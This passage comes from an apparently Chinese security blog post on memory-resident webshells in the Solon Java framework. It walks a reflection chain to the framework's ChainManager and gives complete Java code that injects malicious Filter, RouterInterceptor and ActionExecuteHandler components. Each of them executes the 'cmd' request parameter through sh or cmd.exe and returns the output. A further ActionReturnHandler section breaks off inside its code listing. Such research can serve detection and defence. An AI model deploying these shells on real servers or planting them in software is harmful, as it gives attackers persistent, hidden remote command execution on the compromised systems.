设置报告保存位置</span></span><br><span class="line">searcher.setReport_save_path(<span class="string">&quot;/Users/alphag0/Desktop&quot;</span>);</span><br><span class="line">searcher.searchObject();</span><br></pre></td></tr></table></figure><p>搜索结果中一条符合的构造链如下所示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TargetObject = &#123;java.lang.Thread&#125; </span><br><span class="line">   ---&gt; threadLocals = &#123;java.lang.ThreadLocal$ThreadLocalMap&#125; </span><br><span class="line">    ---&gt; table = &#123;class [Ljava.lang.ThreadLocal$ThreadLocalMap$Entry;&#125; </span><br><span class="line">     ---&gt; [<span class="number">10</span>] = &#123;java.lang.ThreadLocal$ThreadLocalMap$Entry&#125; </span><br><span class="line">      ---&gt; value = &#123;org.noear.solon.boot.smarthttp.http.SmHttpContext&#125; </span><br><span class="line">       ---&gt; _request = &#123;org.smartboot.http.server.impl.HttpRequestImpl&#125; </span><br><span class="line">        ---&gt; request = &#123;org.smartboot.http.server.impl.Request&#125; </span><br><span class="line">          ---&gt; serverHandler = &#123;org.noear.solon.boot.smarthttp.http.SmHttpContextHandler&#125; </span><br><span class="line">           ---&gt; handler = &#123;org.noear.solon.boot.smarthttp.XPluginImp$$Lambda$<span class="number">91</span>/<span class="number">1550228904</span>&#125; </span><br><span class="line">            ---&gt; arg$<span class="number">1</span> = &#123;org.noear.solon.SolonApp&#125; </span><br><span class="line">              ---&gt; _chainManager = &#123;org.noear.solon.core.ChainManager&#125;</span><br></pre></td></tr></table></figure><p>对于获取请求上下文，可以参考官方文档中的<a href="https://solon.noear.org/article/216">认识请求上下文</a>，利用Context ctx &#x3D; Context.current();来直接获取当前上下文。</p><p>Filter内存马实现代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Controller;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Mapping;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Param;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.ChainManager;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Context;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterMemoryShellController</span> &#123;</span><br><span class="line">    <span class="meta">@Mapping(&quot;/inject-filter&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@Param(defaultValue = &quot;world&quot;)</span> String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">evilFilter</span> <span class="operator">=</span> (ctx, chain) -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ctx.param(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ctx.output(output);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            chain.doFilter(ctx);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> Context.current();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">_request</span> <span class="operator">=</span> getfieldobj(ctx,<span class="string">&quot;_request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> getfieldobj(_request,<span class="string">&quot;request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">serverHandler</span> <span class="operator">=</span> getfieldobj(request,<span class="string">&quot;serverHandler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> getfieldobj(serverHandler,<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">arg$1</span> <span class="operator">=</span> getfieldobj(handler,<span class="string">&quot;arg$1&quot;</span>);</span><br><span class="line">        <span class="type">ChainManager</span> <span class="variable">_chainManager</span> <span class="operator">=</span> (ChainManager) getfieldobj(arg$<span class="number">1</span>,<span class="string">&quot;_chainManager&quot;</span>);</span><br><span class="line">        _chainManager.addFilter(evilFilter,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Inject Filter Memory Shell Successfully!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getfieldobj</span><span class="params">(Object obj, String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getSuperclass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729587464456-2434eac5-4fb7-40a4-aaf5-dab9a4b2704e.png"></p><h3 id="RouterInterceptor"><a href="#RouterInterceptor" class="headerlink" title="RouterInterceptor"></a>RouterInterceptor</h3><p>RouterInterceptor内存马与Filter内存马基本类似，在上文分析<font style="color:#000000;background-color:#ffffff;">org.noear.solon.core.route.RouterWrapper类</font>时，可以看到<font style="color:#000000;">还有添加路由拦截器的方法，通过addInterceptor方法来添加Interceptor。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729588686707-8fd36dc7-9cb3-4797-9c99-b05537cd492c.png"></p><p><font style="color:#000000;">Interceptor</font>内存马实现代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Controller;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Mapping;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Param;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.ChainManager;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Context;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Handler;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.route.PathRule;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.route.RouterInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.route.RouterInterceptorChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InterceptorMemoryShellController</span> &#123;</span><br><span class="line">    <span class="meta">@Mapping(&quot;/inject-interceptor&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@Param(defaultValue = &quot;world&quot;)</span> String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> Context.current();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">_request</span> <span class="operator">=</span> getfieldobj(ctx,<span class="string">&quot;_request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> getfieldobj(_request,<span class="string">&quot;request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">serverHandler</span> <span class="operator">=</span> getfieldobj(request,<span class="string">&quot;serverHandler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> getfieldobj(serverHandler,<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">arg$1</span> <span class="operator">=</span> getfieldobj(handler,<span class="string">&quot;arg$1&quot;</span>);</span><br><span class="line">        <span class="type">ChainManager</span> <span class="variable">_chainManager</span> <span class="operator">=</span> (ChainManager) getfieldobj(arg$<span class="number">1</span>,<span class="string">&quot;_chainManager&quot;</span>);</span><br><span class="line">        _chainManager.addInterceptor(<span class="keyword">new</span> <span class="title class_">EvilRouterInterceptor</span>(),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Inject Interceptor Memory Shell Successfully!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getfieldobj</span><span class="params">(Object obj, String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getSuperclass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilRouterInterceptor</span> <span class="keyword">implements</span> <span class="title class_">RouterInterceptor</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PathRule <span class="title function_">pathPatterns</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="comment">//null 表示全部, 这里指定拦截路由hello</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PathRule</span>().include(<span class="string">&quot;/hello&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doIntercept</span><span class="params">(Context ctx, Handler mainHandler, RouterInterceptorChain chain)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ctx.param(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ctx.output(output);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            chain.doIntercept(ctx, mainHandler);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729589730811-98b802fa-f611-434d-b229-ea0b74a0f0ee.png"></p><h3 id="ActionExecuteHandler"><a href="#ActionExecuteHandler" class="headerlink" title="ActionExecuteHandler"></a>ActionExecuteHandler</h3><p>在<font style="color:#000000;">org.noear.solon.core.ChainManager类中，可以看到不仅有addFilter方法和addInterceptor方法，还有addExecuteHandler方法，因此可以采用通过添加恶意Action执行器的方式来打入内存马。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729589890377-1f9cc8ca-8205-4238-9c57-ce787b03fe4b.png"></p><p>ActionExecuteHandler内存马实现代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Controller;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Mapping;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.annotation.Param;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.ChainManager;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.ActionExecuteHandler;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.handle.Context;</span><br><span class="line"><span class="keyword">import</span> org.noear.solon.core.wrap.MethodWrap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ActionExecuteHandlerMemoryShellController</span> &#123;</span><br><span class="line">    <span class="meta">@Mapping(&quot;/inject-execute-handler&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@Param(defaultValue = &quot;world&quot;)</span> String name)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> Context.current();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">_request</span> <span class="operator">=</span> getfieldobj(ctx,<span class="string">&quot;_request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">request</span> <span class="operator">=</span> getfieldobj(_request,<span class="string">&quot;request&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">serverHandler</span> <span class="operator">=</span> getfieldobj(request,<span class="string">&quot;serverHandler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> getfieldobj(serverHandler,<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">arg$1</span> <span class="operator">=</span> getfieldobj(handler,<span class="string">&quot;arg$1&quot;</span>);</span><br><span class="line">        <span class="type">ChainManager</span> <span class="variable">_chainManager</span> <span class="operator">=</span> (ChainManager) getfieldobj(arg$<span class="number">1</span>,<span class="string">&quot;_chainManager&quot;</span>);</span><br><span class="line">        _chainManager.addExecuteHandler(<span class="keyword">new</span> <span class="title class_">EvilExecuteHandler</span>(),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Inject ActionExecuteHandler Memory Shell Successfully!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getfieldobj</span><span class="params">(Object obj, String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getSuperclass().getDeclaredField(Filename);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">fieldobj</span> <span class="operator">=</span> field.get(obj);</span><br><span class="line">            <span class="keyword">return</span> fieldobj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilExecuteHandler</span> <span class="keyword">implements</span> <span class="title class_">ActionExecuteHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">matched</span><span class="params">(Context ctx, String mime)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ctx.param(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, ctx.param(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ctx.output(output);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Object[] resolveArguments(Context ctx, Object target, MethodWrap mWrap) <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">executeHandle</span><span class="params">(Context ctx, Object target, MethodWrap mWrap)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729590810612-9e832f8f-dc67-411e-abaa-f3c987d3c373.png"></p><h3 id="ActionReturnHandler"><a href="#ActionReturnHandler" class="headerlink" title="ActionReturnHandler"></a>ActionReturnHandler</h3><p>和<font style="color:#000000;">打入ActionExecuteHandler内存马类似，在org.noear.solon.core.ChainManager类中还有addReturnHandler方法，它允许开发者对控制器方法的返回值进行自定义处理，因此也可以通过添加恶意的ActionReturnHandler来打入内存马。</font></p><p><img src="/2024/10/22/Solon%E6%A1%86%E6%9E%B6%E5%86%85%E5%AD%98%E9%A9%AC/1729590138906-ce6d6606-1450-4629-b083-099a7950993e.png"></p><p><font style="color:#000000;">ActionReturnHandler</font>内存马实现代码如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 